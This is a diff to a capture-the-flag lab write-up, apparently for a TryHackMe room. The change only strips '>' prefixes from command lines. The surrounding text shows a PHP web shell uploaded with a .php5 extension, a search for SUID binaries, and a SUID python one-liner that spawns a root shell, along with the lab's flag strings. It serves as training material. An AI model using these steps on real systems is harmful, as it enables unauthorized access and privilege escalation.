@@ -50,7 +50,7 @@ lets change it to `RarShell.php5`
 
 BOOOOM!!!! WE GOT IT, lets access our shell `http://MACHINE_IP/uploads/` and run it
 
->find | grep "user.txt" to get our flag
+find | grep "user.txt" to get our flag
 
 
 flag : THM{y0u_g0t_a_sh3ll}
@@ -59,7 +59,7 @@ flag : THM{y0u_g0t_a_sh3ll}
 
 ## Privilege Escalation
 ```
->find / -user root -perm /4000
+find / -user root -perm /4000
 
 
 /usr/bin/newuidmap
@@ -82,10 +82,10 @@ flag : THM{y0u_g0t_a_sh3ll}
 
 ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
->whoami
->root
+whoami
+root
 
->cd /root
+cd /root
 
 flag : THM{pr1v1l3g3_3sc4l4t10n}
 
